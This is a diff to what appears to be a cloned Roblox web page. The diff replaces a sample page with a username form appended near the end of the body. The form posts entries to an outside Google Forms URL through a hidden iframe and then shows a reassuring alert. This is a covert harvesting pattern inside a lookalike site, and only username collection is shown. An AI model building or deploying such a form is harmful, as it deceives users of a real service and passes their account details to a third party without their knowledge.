@@ -974,56 +974,22 @@ function checkRobloxInstall() {
 
     <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/9b43c996571dbdd3acaf13368f292c1c.js'></script>
 
-	<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>Custom Form with Hidden Google Form Submission</title>
-  <style>
-    /* Example Roblox-style button */
-    button {
-      background-color: #0055ff;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      font-size: 16px;
-      cursor: pointer;
-      border-radius: 4px;
-    }
+<form id="customForm" target="hidden_iframe" 
+      action="https://docs.google.com/forms/d/e/1FAIpQLSen_Jyu6eTPX_bIPezX29gWSrCQLZFTBMw7t9mfP8m1yCorBw/formResponse" 
+      method="POST">
 
-    /* Hide the iframe completely */
-    #hidden_iframe {
-      display: none;
-      width: 0;
-      height: 0;
-      border: 0;
-    }
-  </style>
-</head>
-<body>
-  <h1>Welcome to My Roblox-style Site</h1>
+  <input type="text" name="entry.1952639901" placeholder="Enter username" required />
+  <button type="submit">Submit</button>
+</form>
 
-  <!-- Your custom input -->
-  <form id="customForm" target="hidden_iframe" action="https://docs.google.com/forms/d/e/1FAIpQLScIMACoJ4kVwdYzT6CBIWgvlbiJfBB7bUTDW8K5oqfCR8z0ug/formResponse" method="POST">
+<iframe name="hidden_iframe" style="display:none;"></iframe>
 
-    <!-- Replace entry.XXXXXX with your actual Google Form input name -->
-    <input type="text" name="entry.1234567890" placeholder="Enter username" required />
-    
-    <button type="submit">Submit</button>
-  </form>
-
-  <!-- Hidden iframe to submit form invisibly -->
-  <iframe name="hidden_iframe" id="hidden_iframe"></iframe>
-
-  <script>
-    const form = document.getElementById('customForm');
-    form.addEventListener('submit', () => {
-      alert('Thanks! Your username was submitted.');
-      // You can also reset form here if you want:
-      // form.reset();
-    });
-  </script>
-</body>
-</html>
+<script>
+  const form = document.getElementById('customForm');
+  form.addEventListener('submit', () => {
+    alert('Thanks! Your username was submitted.');
+    form.reset();
+  });
+</script>
 </body>
 </html>
